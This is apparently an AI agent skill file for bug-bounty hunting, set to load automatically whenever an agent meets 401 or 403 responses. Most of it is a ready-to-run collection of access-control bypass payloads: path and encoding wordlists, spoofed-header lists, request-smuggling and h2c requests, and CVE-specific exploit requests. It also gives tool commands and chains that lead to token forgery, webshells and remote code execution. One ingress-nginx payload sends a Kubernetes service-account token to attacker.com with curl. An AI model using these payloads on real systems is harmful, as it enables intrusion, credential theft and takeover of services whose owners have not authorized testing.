---
name: hunt-403-bypass
description: "Use this skill whenever you hit 401 Unauthorized, 403 Forbidden, 404 (when the path clearly exists), or 405 Method Not Allowed on a sensitive path — `/admin`, `/api/internal`, `/actuator`, `/console`, `/manager`, `/.git`, `/debug`, `/swagger`, `/graphql`. Load automatically when nuclei/ffuf reports 403 on enumerated paths. Only invoke if real impact potential exists — bypassing 403 to reach a non-sensitive page is not a finding; bypassing to reach admin functionality, internal APIs, debug consoles, or other-user data is."
type: hunt
---

# Hunt: 403 / 401 BYPASS — ELITE EDITION (2024–2026)

The forbidden response is usually enforced by a reverse proxy (Nginx, HAProxy, AWS ALB, Cloudflare, F5, Traefik, Caddy, Varnish) using URL/header rules. The application behind it has no such restriction. The bypass = find a request the proxy treats as one URL and the app treats as another.

---

## Quick Fingerprint → Bypass Mapping

Before sending payloads, fingerprint the enforcement layer from response headers:

| Signal | Layer | Best Bypass |
|---|---|---|
| `Server: nginx` | Nginx ACL | Trailing slash, `//admin`, `X-Original-URL`, `..;/` |
| `Server: Apache` | Apache httpd | `?` suffix (CVE-2024-38474), `%3f`, `%2e%2e` double-decode |
| `Via: 1.1 cloudflare` | Cloudflare WAF | Extension append, h2c smuggling, 100-header exhaustion |
| `X-Powered-By: Spring Boot` / Spring favicon | Spring Boot | `/actuator;/env`, trailing-slash, `..;/` |
| `X-Amzn-*` headers / ALB | AWS ALB | `/.;/admin`, `//admin`, unkeyed query param |
| `Via: traefik` / Traefik error pages | Traefik | `%2f`, `%3b`, `%3f`, `%00` encoded (CVE-2025-47952/66490) |
| `Server: Kestrel` or ASP.NET | ASP.NET Core | `\admin`, `admin%2f`, method override |
| `x-envoy-*` headers | Istio/Envoy | `/admin%2fusers`, `//admin`, path traversal |
| `X-Powered-By: Express` / Node.js | Fastify/Express | `//admin`, `/admin;bypass` (CVE-2026-33808) |
| `x-kubernetes-*` / ingress-nginx | K8s Ingress | CVE-2024-7646 annotation bypass, auth-url bypass |
| IIS headers / Windows | IIS | `\admin`, `admin::$DATA`, case insensitive |
| `Via: 1.1 varnish` | Varnish | Cache key differential, CSD (client-side desync) |

---

## Crown Jewel Targets (Highest Bounty Potential)

- `/actuator/*` — Spring Boot: `env`, `heapdump`, `beans`, `mappings`, `jolokia`, `configprops`
- `/admin*`, `/administrator`, `/wp-admin`, `/dashboard`, `/manage`, `/management`
- `/console`, `/h2-console`, `/_console`, `/manager/html` (Tomcat)
- `/api/internal/*`, `/api/v1/admin`, `/api/_debug`, `/api/v0/*`
- `/.git/config`, `/.env`, `/.aws/credentials`, `/.svn/entries`, `/.DS_Store`
- `/server-status`, `/server-info` (Apache mod_status)
- `/debug`, `/_debug_bar`, `/_profiler`, `/__debug__`, `/__webpack_hmr`
- `/swagger`, `/swagger-ui.html`, `/openapi.json`, `/api-docs`, `/v2/api-docs`, `/v3/api-docs`
- `/graphql` with introspection
- `/metrics`, `/prometheus`, `/jolokia`, `/heapdump`, `/trace`, `/env`
- `/.well-known/acme-challenge/` (WAF bypass path — Cloudflare, unpatched pre-Oct 2025)
- `/internal/*`, `/private/*`, `/backend/*`
- `/health`, `/healthz` — may expose internal topology
- `/robots.txt`, `/sitemap.xml` — often reveals hidden paths

---

## Detection Signals

- `403 Forbidden` with proxy header (`Server: nginx`, `Server: cloudflare`, ALB markers)
- `401 Unauthorized` with `WWW-Authenticate: Basic realm="..."` or empty
- `404 Not Found` on path confirmed by JS bundles / sitemap / robots.txt / Wayback
- `405 Method Not Allowed` — try other verbs
- HEAD responds differently from GET → bypass candidate
- Content-Length differs between `/admin` vs `/admin/` → routing differential
- `302 Redirect to /login` but response body contains the protected page content → intercept redirect
- Response time differs significantly for known vs. unknown paths → path exists behind 403

---

## Attack Techniques

### 1. Path Manipulation (Proxy vs App Parsing Differential)

```
/admin              → 403 (baseline)
/admin/             → 200    ← trailing slash; breaks Nginx `location = /admin`
/admin/.            → 200    ← dot = current dir
/admin/./           → 200
/admin//            → 200    ← double slash collapses on app
//admin             → 200    ← AWS ALB bypass; Fastify CVE-2026-33808
///admin            → 200    ← triple slash
/./admin            → 200    ← dot-slash prefix
/admin?             → 200    ← query confusion; breaks regex match
/admin?x=1          → 200    ← unkeyed param, cache miss → origin
/admin#             → 200    ← fragment (client-side only; server never sees)
/admin*             → 200    ← Nginx glob misconfig
/admin/*            → 200
/admin/.json        → 200    ← extension append
/admin.json         → 200    ← static extension whitelist bypass
/admin.html         → 200
/admin.php          → 200
/admin.css          → 200
/admin.png          → 200
/admin%20           → 200    ← trailing URL-encoded space
/admin%09           → 200    ← tab
/admin%00           → 200    ← null byte
/admin%0d           → 200
/admin%0a           → 200
/admin/x/..         → 200    ← traversal that resolves back
/admin/x/../        → 200
```

#### Semicolon / Path-Param (Java Tomcat / Spring)
```
/admin;             → 200
/admin;/            → 200
/admin;param=x      → 200
/admin;jsessionid=x → 200    ← session ID appended; proxy passes, servlet strips
/admin;.css         → 200    ← extension smuggling via matrix param
/admin;foo/         → 200
/admin/;            → 200
```

#### ..;/ Family (Tomcat Path-Param Strip)
```
/admin/..;/         → 200    ← classic Tomcat bypass
/admin..;/          → 200
/.;/admin           → 200    ← dot-semicolon prefix
/..;/admin          → 200
/x/..;/admin        → 200    ← when Nginx prefix rule on /x/
```

#### Spring Boot Actuator Semicolon Bypass (PROVEN in multiple H1 reports)
```
/actuator;/env
/actuator/;/env
/actuator/env;..
/actuator;foo/env
/actuator/heapdump;..
```

### 2. URL Encoding & Double-Encoding

```
/%61dmin            ← hex-encode 'a'
/%2e/admin          ← encode '.'
/%2f/admin          ← encode '/'
/admin%2f           ← encoded trailing /  (Traefik CVE-2025-66490)
/admin%3b           ← encoded ';'        (Traefik CVE-2025-66490)
/admin%3f           ← encoded '?' Apache ACL bypass (CVE-2024-38474/Orange Tsai)
/admin%00           ← null byte
/admin%252f         ← double-encode / → WAF sees %, app decodes to /
/%252e%252e/admin   ← double-encode ..  (Spring CVE-2024-38819)
/%2e%2e/admin       ← single-encode ..
/ad%6din            ← partial encode; WAF pattern misses
/admin%e2%80%8b     ← zero-width space U+200B
/%ef%bc%8fadmin     ← fullwidth / U+FF0F
/%c0%afadmin        ← overlong UTF-8 / (legacy IIS/Tomcat)
```

### 3. Backslash / Windows-Style (IIS)

```
/admin\
\admin
\\admin
/admin\..\admin
/admin::$DATA       ← NTFS alternate data stream
```

### 4. Case Manipulation

```
/Admin
/ADMIN
/aDmIn
/WP-ADMIN           ← real-world Nginx case-sensitive bypass
/ACTUATOR/env
```

### 5. Unicode / Fullwidth Characters (WAF Bypass)

```
/ａdmin             ← fullwidth 'a' U+FF41 → normalizes to /admin
/admın              ← dotless 'i' U+0131 → normalizes to /admin (Turkish locale)
/ɑdmin              ← U+0251 → normalizes to 'a'
```

### 6. HTTP Method Override

```
POST /admin          → 200    ← restriction only on GET
PUT /admin
PATCH /admin
DELETE /admin
OPTIONS /admin       → leaks Allow: header
HEAD /admin          → no body; sometimes skips auth
TRACE /admin         → echoes request (XST)
CONNECT /admin
DEBUG /admin         ← IIS debug verb
PROPFIND /admin      ← WebDAV
LOCK /admin
MOVE /admin
```

Method-override headers:
```
X-HTTP-Method-Override: POST
X-HTTP-Method: PUT
X-Method-Override: DELETE
_method=PUT          ← in body or query (Rails, Laravel, Symfony)
```

### 7. Header-Based IP / Path Spoofing

Complete IP spoof header arsenal:
```
X-Forwarded-For: 127.0.0.1
X-Forwarded-For: 10.0.0.1
X-Forwarded-For: 169.254.169.254
X-Forwarded-For: 127.0.0.1, 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Custom-IP-Authorization: 127.0.0.1
Client-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
Cluster-Client-IP: 127.0.0.1
CF-Connecting-IP: 127.0.0.1
X-ProxyUser-Ip: 127.0.0.1
Via: 1.1 127.0.0.1
Forwarded: for=127.0.0.1
X-Original-Remote-Addr: 127.0.0.1
X-Forwarded-For: <enumerate-internal-IP-from-recon>
```

Path override headers (proxy rewrite):
```
X-Original-URL: /admin          ← Nginx / Django (H1 #737323, proven)
X-Rewrite-URL: /admin           ← Nginx (H1 #737323, proven)
X-Override-URL: /admin
Base-Url: /admin
Http-Url: /admin
Proxy-Url: http://localhost/admin
Request-Uri: /admin
Uri: /admin
Url: http://localhost/admin
```

Referer / Origin trust:
```
Referer: https://target.com/admin
Referer: https://target.com/
Origin: https://target.com
```

Host spoofing:
```
X-Host: localhost
X-Forwarded-Host: localhost
X-Forwarded-Server: localhost
```

Internal origin hints:
```
X-Internal-Request: true
X-Admin-Panel: enabled
X-Backend-Request: 1
```

### 8. User-Agent Spoofing (Whitelist Bypass)

```
User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)
User-Agent: InternalApp/1.0
User-Agent: Mozilla/5.0 (compatible; monitoring-bot/1.0)
User-Agent: curl/7.68.0
User-Agent: python-requests/2.28.0
```

### 9. Auth Header Tricks

```
Authorization: Bearer null
Authorization: Bearer undefined
Authorization: Bearer 0
Authorization: Bearer
Authorization: Basic Og==      ← base64(":")
Authorization: Basic null
Cookie: admin=true; isAdmin=1; role=admin
```

### 10. API Version Bypass (PROVEN technique)

```
/api/v1/admin    → 403
/api/v2/admin    → 200    ← ACL not applied to v2
/api/v0/admin    → 200    ← legacy, no ACL
/api/beta/admin  → 200    ← beta paths WAF-excluded
/api/admin       → 200    ← unversioned
/API/V1/admin    → 200    ← case sensitivity on prefix
```

Version in headers:
```
API-Version: 1
Accept: application/vnd.api+json;version=1
X-Api-Version: 2
```

### 11. GraphQL Introspection Bypass (5 techniques)

```graphql
# A — Newline/tab injection
{ __schema\n{ types { name } } }
{ __schema\t{ types { name } } }

# B — Use __type instead of __schema
{ __type(name:"Query") { fields { name type { name } } } }

# C — Method switch (POST→GET)
GET /graphql?query={__schema{types{name}}} → 200

# D — Content-Type switch
POST /graphql  Content-Type: application/graphql   (not application/json)

# E — Clairvoyance (error-based schema reconstruction)
# Send invalid fields → error messages reveal valid field names
```

### 12. Hop-by-Hop Header Abuse

Strip the proxy's own injected auth header before it reaches the backend:
```
GET /admin HTTP/1.1
Host: target.com
Connection: close, X-Forwarded-For, X-Internal-Auth
```

Or strip an auth token the proxy adds:
```
GET /admin HTTP/1.1
Connection: X-Auth-Token, X-Internal-IP
```

If the backend grants access when these headers are absent — bypass achieved.

### 13. HTTP Version Downgrade

```
GET /admin HTTP/1.0           ← no Host header required; proxy may skip ACL
[no Host header]

GET /admin HTTP/0.9\r\n       ← ultra-legacy; no headers possible
```

### 14. HTTP/2 Pseudo-Header Manipulation

```bash
curl --http2-prior-knowledge -k 'https://target/safe' -H ':path: /admin'
nghttp -v 'https://target/' --header=':path: /admin'
```

Duplicate `:path` (RFC violation, behavior varies):
```
:method GET
:path /public
:path /admin
:authority target.com
```

### 15. WebSocket Upgrade Bypass

```
GET /admin HTTP/1.1
Host: target.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
```

Proxies route WS upgrades to a different backend that may lack the ACL.

### 16. Cache Key Differential (Unkeyed Query Param)

If proxy cached the 403 for `/admin`:
```
GET /admin?cb=12345   → cache miss → hits origin directly (may 200)
GET /admin?_=1
GET /admin?nocache=xyz
```

### 17. Redirect Interception (Stop-the-Redirect)

1. Send request to `/admin`
2. Server returns `302 Found → Location: /login` but body = full admin page
3. In Burp: disable "follow redirects" → read admin page content from 302 body

**PROVEN:** Mail.ru H1 #683957 (admin upload → webshell), Razer H1 #736273 ($1K).

### 18. Parameter Pollution / Reversal

```
/admin?role=user&token=xxx    → 403
/admin?token=xxx&role=user    → 200    ← param order matters

/admin?admin=false&admin=true ← HPP; app takes last, ACL takes first
/admin?role=user;admin        ← semicolon injection
```

### 19. Content-Type / Accept Negotiation

```
GET /admin HTTP/1.1
Accept: application/json      ← JSON handler may lack HTML auth

GET /admin HTTP/1.1
Content-Type: application/x-protobuf  ← triggers protobuf path, skips middleware

POST /api/internal HTTP/1.1
Content-Type: application/grpc-web+json  ← gRPC path, skips REST middleware
```

---

## Advanced Techniques (2024–2026)

### A. H2C Smuggling — HTTP/2 Cleartext Upgrade (Proxy ACL Bypass)

**Why it works:** Proxy forwards `Upgrade: h2c` to backend → backend replies `101 Switching Protocols` → proxy opens unmanaged TCP tunnel → ALL subsequent requests bypass proxy ACL/WAF.

**Vulnerable by default:** HAProxy, Traefik, Nuster, Azure Application Gateway + WAF, Cloudflare (partial).

```
GET / HTTP/1.1
Host: target.com
Upgrade: h2c
HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA
Connection: Upgrade, HTTP2-Settings
```

After 101, send HTTP/2 frames to `/admin`, `/actuator/env`, `/internal`.

```bash
python3 h2csmuggler.py -x https://target.com/ -X GET /admin
python3 h2csmuggler.py -x https://target.com/ -X GET /actuator/env
go run ./cmd/h2csmuggler smuggle https://target.com/admin /flag
```

### B. HTTP Request Smuggling (CL.TE / TE.CL / TE.TE / H2.TE / H2.CL)

**CL.TE** — front-end uses Content-Length, back-end uses Transfer-Encoding:
```
POST / HTTP/1.1
Host: target.com
Content-Length: 54
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: target.com
```

**TE.0 Google IAP Bypass** (bounty $8,500 May 2024) — backend ignores Transfer-Encoding entirely:
```
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Content-Length: 4

7c
GET /admin HTTP/1.1
Host: target.com
Content-Length: 0

0


```

**Obfuscated TE headers** (one proxy honors, the other ignores):
```
Transfer-Encoding: xchunked
Transfer-Encoding: CHUNKED
Transfer-Encoding: chunked\x00
Transfer-Encoding: \x0bchunked
X-Transfer-Encoding: chunked
X: X\nTransfer-Encoding: chunked
```

**H2.CL** (HTTP/2 front + HTTP/1.1 back, Content-Length injection):
Inject a Content-Length header in HTTP/2 body that the downgraded HTTP/1.1 backend uses, causing it to treat part of the body as a new request to `/admin`.

**H2.TE via CRLF injection in header values:**
```
:method POST
foo: bar\r\ntransfer-encoding: chunked
```
Becomes on downgrade: `foo: bar\r\nTransfer-Encoding: chunked`

### C. HTTP/2 Request Tunneling (CRLF in Header Name)

```
Header name:  foo: bar\r\nContent-Length: 500\r\n\r\nGET /admin HTTP/1.1\r\nHost: target.com\r\nX-SSL-VERIFIED: 1\r\n\r\n
Header value: xyz
```

Delivers a second complete HTTP/1.1 request to the backend with spoofed internal auth headers.

**Lab:** PortSwigger "Bypassing access controls via HTTP/2 request tunnelling"

### D. Apache Confusion Attacks (Orange Tsai / Black Hat 2024 — #1 Technique of 2024)

**CVE-2024-38474 — Encoded `?` ACL bypass:** A `?` or `%3f` in crafted URLs exploits semantic ambiguity between Apache modules. The ACL module sees one path; mod_proxy sees another.

```
/admin?                      ← question mark confusion
/admin%3f                    ← URL-encoded version
/admin%3f/                   ← with trailing slash
/admin%3f../public           ← combined traversal
```

**CVEs:** CVE-2024-38472/38473/38474/38475/38476/38477/38477, CVE-2024-39573  
**Affected:** Apache httpd ≤ 2.4.59 | **Fixed:** Apache 2.4.60

### E. Spring WebFlux Auth Bypass (CVE-2024-38821 — CVSS 9.1)

**Mechanism:** Spring WebFlux security filter fails to match un-normalized URLs on static resources.

```
GET /protected-static-resource\ HTTP/1.1
GET /protected-static-resource// HTTP/1.1
```

**Affected:** Spring Security 5.7.0–5.7.12, 5.8.0–5.8.14, 6.0.0–6.0.12, 6.1.0–6.1.10, 6.2.0–6.2.6, 6.3.0–6.3.3

### F. Spring Boot Actuator Authorization Bypass (CVE-2026-40976 — CVSS 9.1)

**Mechanism:** When `spring-boot-actuator-autoconfigure` is present but `spring-boot-health` is NOT, conditional auth logic never executes. ALL actuator endpoints exposed unauthenticated.

```
GET /actuator/env      → 200 (no auth needed)
GET /actuator/heapdump → 200
GET /actuator/configprops → 200
```

**Affected:** Spring Boot 4.0.0–4.0.5 | **Fixed:** Spring Boot 4.0.6

### G. Spring Framework Path Traversal (CVE-2024-38819 — Double URL Encoding)

```
GET /static/%252e%252e/%252e%252e/WEB-INF/web.xml
```

**Decoding:** `%252e%252e` → `%2e%2e` → `..`  
**Affected:** Spring Framework <5.3.41, <6.0.25, <6.1.14

### H. Traefik Path Bypass (CVE-2025-66490 + CVE-2025-47952)

```
GET /admin%2f              ← encoded slash (router rule miss)
GET /admin%3b              ← encoded semicolon
GET /admin%00              ← null byte
GET /admin%3f              ← encoded question mark
GET /service%2f..%2fadmin  ← encoded traversal
```

**Affected:** Traefik ≤2.11.31, ≤3.6.2 | **Fixed:** 2.11.32, 3.6.3

### I. Fastify Middleware Normalization Gap (CVE-2026-33808 / CVE-2026-2880)

**Node.js Fastify stacks:**
```
GET //admin/secret         ← ignoreDuplicateSlashes config
GET /admin;bypass          ← useSemicolonDelimiter config
GET ///admin               ← triple slash
```

**Detection:** `Server: fastify` header  
**Affected:** @fastify/express ≤4.0.4, @fastify/middie ≤9.3.1

### J. PAN-OS Nginx/Apache Double-Decode (CVE-2025-0108 — CVSS 10.0)

**Mechanism:** Nginx decodes URL once (matches `/unauth/` prefix → no auth); Apache rewrite decodes twice (`%252e%252e` → `%2e%2e` → `..`) → traverses to PHP handler.

```
GET /unauth/%252e%252e/php/ztp_gate.php/PAN_help/x.css HTTP/1.1
```

**Affected:** PAN-OS 10.2.x < 10.2.14, 11.0.x < 11.0.7, 11.2.x < 11.2.5

### K. Cloudflare WAF Bypass via ACME Path (H1 #3027461 — Oct 2025, PATCHED)

**Mechanism:** Cloudflare disabled WAF inspection for ACME HTTP-01 challenge paths without verifying the token was a real active challenge. Any arbitrary token bypassed ALL WAF rules.

```
GET /.well-known/acme-challenge/ANYARBITRARYTOKEN HTTP/1.1
Host: target.com
X-Injected-Payload: <malicious payload>   ← WAF won't inspect this
```

**Status:** PATCHED Oct 27, 2025 — check if target has old Cloudflare edge config

### L. Cloudflare Header Exhaustion (H1 #3027461 — documented 2024)

**Mechanism:** OpenResty (Cloudflare) parses max 100 HTTP headers including internal ones. Send 97-99 junk headers → WAF runs out of slots → subsequent headers not evaluated.

```python
headers = {f"X-Junk-{i}": "a" * 10 for i in range(97)}
headers["X-Injection-Header"] = "<sql injection or xss>"
```

### M. Kubernetes ingress-nginx Annotation Bypass (CVE-2024-7646 — CVSS 8.8)

**Mechanism:** Embed `\r` in annotation value to bypass validation regex → inject arbitrary NGINX config → RCE / cluster credential theft.

```yaml
annotations:
  nginx.ingress.kubernetes.io/configuration-snippet: |
    content_by_l\rua_block {
      os.execute("curl attacker.com/$(cat /var/run/secrets/token)")
    }
```

**Affected:** ingress-nginx < v1.11.2 / < v1.10.4

### N. ingress-nginx auth-url Bypass (CVE-2026-24513)

When custom-errors backend is configured and ignores `X-Code` header → auth service 401/403 is silently consumed → request proceeds to origin.

### O. gRPC Missing Leading Slash Bypass (CVE-2026-33186 — CVSS 9.1)

**Mechanism:** Authorization interceptor evaluates raw `:path`; routing normalizes it. Omitting the leading `/` defeats deny rules.

```python
headers = [
    (':method', 'POST'),
    (':path', 'package.Service/ProtectedMethod'),  # NO leading slash
    ('content-type', 'application/grpc'),
]
```

**Affected:** grpc-go < v1.79.3

### P. Apache Traffic Server Chunked Trailer Injection (CVE-2024-35161)

```
POST /api/data HTTP/1.1
Transfer-Encoding: chunked
Trailer: X-Auth-Bypass

5
hello
0
X-Auth-Bypass: admin

```

ATS forwards trailer header `X-Auth-Bypass: admin` to backend as a regular header.

### Q. AWS API Gateway Trailing/Double-Slash Auth Bypass (Bounty: $12K, April 2026)

**Mechanism:** Lambda authorizer checks JWT against path; path normalization difference between API Gateway routing and Lambda causes auth bypass.

```
GET //api/admin/users        → gateway routes; authorizer skips
GET /api/admin/users/        → trailing slash passes auth check
GET /api/admin//users        → internal double slash
```

### R. Istio/Envoy Path Normalization Policy Bypass

```
GET /admin%2fusers     ← Istio sees /admin%2fusers (no DENY match); backend normalizes to /admin/users
GET /admin/..%2fsecret ← encoded traversal in policy bypass
GET //admin            ← double slash
```

### S. HTTP/3 QUIC — WAF Blind Spot

Many WAFs inspect TCP not UDP/QUIC. If target advertises HTTP/3 via `Alt-Svc: h3=":443"`:

```bash
curl --http3 https://target.com/admin
```

HTTP/3 traffic bypasses TCP-based WAF inspection entirely.

### T. Varnish Client-Side Desync (CSD)

Send partial request with `Content-Length: X` and no body → wait for Varnish timeout (15s) → Varnish reuses connection → second request treated as new without ACL evaluation.

### U. TRACE Desync

```
GET / HTTP/1.1
Content-Length: 89

HEAD / HTTP/1.1

TRACE / HTTP/1.1
SomeHeader: <malicious>
```

Smuggled TRACE bypasses proxy's 403 on TRACE and delivers it to the backend. Backend reflects all headers → XSS or header injection.

### V. DNS Rebinding for localhost-only Admin Interfaces

1. Victim visits `attacker.com` (TTL = 1s)
2. JavaScript executes; DNS re-queried → `attacker.com` resolves to `127.0.0.1`
3. XHR to `attacker.com` satisfies same-origin; hits localhost admin interface
4. **Fast rebinding trick:** Use `0.0.0.0` (= localhost on Linux/macOS) — bypasses filters on `127.0.0.1`

**Tool:** Singularity of Origin (`github.com/nccgroup/singularity`)

---

## Payloads — Extended Bypass Path Wordlist

```
/admin
/admin/
/admin//
/admin/.
/admin/./
/admin/..
/admin/..;/
/admin/../
/admin..;/
/admin;
/admin;/
/admin;%2f
/admin;foo
/admin;jsessionid=x
/admin;.css
/admin%20
/admin%09
/admin%00
/admin%0a
/admin%0d
/admin#
/admin?
/admin*
/admin/*
//admin
///admin
/./admin
/././admin
/%2e/admin
/%2f/admin
/%20admin
/admin/.json
/admin/.html
/admin.json
/admin.html
/admin.php
/admin.css
/admin.png
/admin.js
/.;/admin
/..;/admin
/%2e%2e/admin
/admin%252f
/admin%2f
/admin%3b
/admin%3f
/admin%00
/admin\
/Admin
/ADMIN
/aDmIn
/api/v0/admin
/api/v2/admin
/api/beta/admin
/api/admin
```

Extended headers wordlist:
```
X-Original-URL: /admin
X-Rewrite-URL: /admin
X-Override-URL: /admin
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Forwarded-Host: localhost
X-Custom-IP-Authorization: 127.0.0.1
X-Host: localhost
X-Forwarded-Server: localhost
X-HTTP-Method-Override: GET
X-Method-Override: GET
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Originating-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
Cluster-Client-IP: 127.0.0.1
CF-Connecting-IP: 127.0.0.1
Forwarded: for=127.0.0.1
X-Internal-Request: true
```

---

## Bypass Method → Layer Matrix (Expanded)

| Layer enforcing 403 | Best bypass approach |
|---|---|
| Nginx `location = /admin` (exact) | `/admin/`, `/admin/.`, `//admin` |
| Nginx `location /admin` (prefix) | path traversal upstream `/x/..%2fadmin` |
| Nginx off-by-slash alias | `/static../` |
| Apache `<Location>` | `;`, `%00`, `?` (CVE-2024-38474), case |
| Apache mod_rewrite | `%3f`, backreference bypass, `?` confusion |
| AWS ALB path rules | `/.;/admin`, `//admin`, unkeyed query param |
| Cloudflare WAF | extension append (.json/.css), h2c smuggling, 100-header exhaustion, ACME path |
| Spring Security antMatchers | `/admin/` vs `/admin`, `;jsessionid=x`, backslash, `//` |
| Spring WebFlux | `\` suffix, `//` (CVE-2024-38821) |
| Spring Boot Actuator | `/actuator;/env`, `;foo/`, trailing `..` |
| IIS URL Rewrite | `\admin`, `/admin::$DATA` |
| Tomcat path ACL | `/admin/..;/`, `;jsessionid=`, `;.css` |
| Traefik | `%2f`, `%3b`, `%3f`, `%00` encoded (CVE-2025-47952/66490) |
| Fastify/Express (Node.js) | `//admin`, `/admin;x` (CVE-2026-33808) |
| Kubernetes ingress-nginx | CVE-2024-7646 annotation bypass, auth-url bypass |
| Any proxy (protocol) | h2c smuggling, CL.TE/TE.CL smuggling, H2.CL/H2.TE |
| Application middleware | method override, `X-Original-URL`, hop-by-hop strip |
| Cache layer | unkeyed query param, web cache deception |
| gRPC endpoint | missing leading slash (CVE-2026-33186) |
| Varnish | CSD (partial request + timeout), unkeyed param |
| HAProxy | h2c smuggling, hop-by-hop abuse |

---

## Tools

```bash
# nomore403 — most comprehensive 2025 (22 techniques, 4400+ payloads)
nomore403 -u https://target.com/admin -t 50 --proxy http://127.0.0.1:8080

# dontgo403
dontgo403 -u https://target.com/admin -t 50

# byp4xx
byp4xx https://target.com/admin

# 4-ZERO-3 (403/401 bypass combinations)
python3 4-ZERO-3.py -u https://target.com/admin

# gobypass403 (preserves exact path)
gobypass403 -u https://target.com/admin

# bypass-403 (iamj0ker)
bypass-403.sh https://target.com/admin

# ffuf — path mutations
ffuf -u 'https://target.com/adminFUZZ' \
  -w /usr/share/seclists/Fuzzing/403-Bypasses/paths.txt \
  -mc 200,302,401 -fc 403 -t 50

# ffuf — header fuzzing
ffuf -u 'https://target.com/admin' \
  -H 'FUZZ: 127.0.0.1' \
  -w /usr/share/seclists/Fuzzing/403-Bypasses/headers.txt \
  -mc 200 -t 30

# ffuf — API version bypass
ffuf -u 'https://target.com/api/FUZZ/admin' \
  -w <(printf "v0\nv1\nv2\nv3\nbeta\nalpha\nlatest") \
  -mc 200,302 -fc 403

# ffuf — method fuzzing
ffuf -u 'https://target.com/admin' \
  -X FUZZ \
  -w <(printf "GET\nPOST\nPUT\nPATCH\nDELETE\nHEAD\nOPTIONS\nTRACE\nPROPFIND\nDEBUG") \
  -mc 200,302

# h2cSmuggler — HTTP/2 cleartext bypass
python3 h2csmuggler.py -x https://target.com/ -X GET /admin
python3 h2csmuggler.py -x https://target.com/ -X GET /actuator/env

# Nuclei
nuclei -u https://target -tags 403-bypass,exposure,actuator -o 403-results.txt
nuclei -u https://target -t http/misconfiguration/

# XFFenum — enumerate internal IPs in X-Forwarded-For
xffenum -u https://target.com/admin -w /path/to/internal-ips.txt

# Burp extensions
# - HTTP Request Smuggler (all CL/TE/H2 variants)
# - 403 Bypasser (BApp Store)
# - URL Fuzzer 401/403 Bypass (BApp Store)
# - Param Miner (cache key discovery)

# HTTP/3 bypass test
curl --http3 https://target.com/admin

# DNS Rebinding
# Tool: github.com/nccgroup/singularity
```

---

## CVE Quick Reference (2024–2026)

| CVE | What | CVSS | Status |
|---|---|---|---|
| CVE-2026-40976 | Spring Boot 4.0 Actuator auth bypass (missing dependency) | 9.1 | Fixed 4.0.6 |
| CVE-2026-33808 | @fastify/express path normalization bypass | 9.1 | Fixed 4.0.5 |
| CVE-2026-2880 | @fastify/middie path normalization bypass | High | Fixed 9.3.2 |
| CVE-2026-33186 | gRPC-Go missing leading slash auth bypass | 9.1 | Fixed v1.79.3 |
| CVE-2026-24513 | ingress-nginx auth-url + custom-error backend bypass | Med | Fixed 1.13.7/1.14.3 |
| CVE-2025-0108 | PAN-OS Nginx/Apache double-decode path confusion | 10.0 | Fixed |
| CVE-2025-66490 | Traefik path normalization bypass | High | Fixed 2.11.32/3.6.3 |
| CVE-2025-47952 | Traefik URL encoding path traversal bypass | High | Fixed 2.11.25/3.4.1 |
| CVE-2025-1974 | IngressNightmare K8s ingress RCE | 9.8 | Fixed 1.11.5 |
| CVE-2024-38821 | Spring WebFlux static resource auth bypass | 9.1 | Fixed 6.3.4 |
| CVE-2024-38819 | Spring Framework double URL-encoding path traversal | High | Fixed 6.1.14 |
| CVE-2024-38475 | Apache mod_rewrite ACL bypass (KEV) | Critical | Fixed 2.4.60 |
| CVE-2024-38474 | Apache mod_rewrite encoded `?` ACL bypass | Critical | Fixed 2.4.60 |
| CVE-2024-50379 | Apache Tomcat TOCTOU RCE (case-insensitive FS) | 9.8 | Fixed 9.0.98 |
| CVE-2024-7646 | ingress-nginx annotation `\r` bypass → RCE | 8.8 | Fixed 1.11.2 |
| CVE-2024-35161 | Apache Traffic Server chunked trailer header injection | High | Fixed 9.2.4 |
| CVE-2024-45410 | Traefik hop-by-hop header abuse | Medium | Fixed |

---

## Impact Levels

- **Critical** — 403 bypass → `/actuator/heapdump` → JWT signing key → forge admin token → ATO ($12.5K range)
- **Critical** — 403 bypass → `/jolokia` → MBean RCE; bypass → debug console → code execution
- **Critical** — h2c smuggling → bypass WAF → exploit SQLi/SSRF that WAF was blocking
- **Critical** — CL.TE/TE.CL smuggling → bypass front-end auth proxy → admin ATO
- **High** — 403 bypass → `/api/internal/users` → mass PII; bypass → `/swagger.json` → hidden endpoint → IDOR
- **High** — 403 bypass → `/.git/config` → clone repo → secrets in git history
- **Medium** — 403 bypass → Swagger/OpenAPI (non-public APIs), `/metrics` (internal topology)
- **Low/N-A** — bypass to non-sensitive page; 404→200 on a marketing route

---

## Chain Potential (High-Value Attack Chains)

```
1. 403 → /actuator;/heapdump → strings heapdump → JWT secret → forge admin token → ATO
   (LY Corporation H1 #838635, $12.5K)

2. 403 → /jolokia → MBean RCE
   (direct code execution via JMX)

3. 403 → /swagger.json → enumerate hidden endpoints → IDOR/admin actions

4. 403 → /.git/config → git clone → secrets in commit history

5. 403 → /api/users → mass PII enumeration

6. 403 → /h2-console → SQL → RCE (CVE-2021-42392, H2 database)

7. 403 bypass via h2c smuggling → SSRF to 169.254.169.254 → AWS IAM creds → cloud admin

8. 403 bypass via X-Original-URL → admin panel → add user / change password → ATO

9. 403 bypass (redirect intercept) → admin upload form → webshell → RCE
   (Mail.ru H1 #683957)

10. 403 bypass → /api/v0/admin → GraphQL → introspection → map all admin mutations → ATO

11. Traefik %2f bypass → internal admin route → exec endpoint → RCE

12. AWS API Gateway // bypass → Lambda authorizer skip → admin API → mass export PII ($12K)

13. Spring CVE-2024-38821 → access protected static resource → JS with embedded API keys → ATO

14. Apache CVE-2024-38474 `?` confusion → bypass Location block → access restricted CGI → RCE

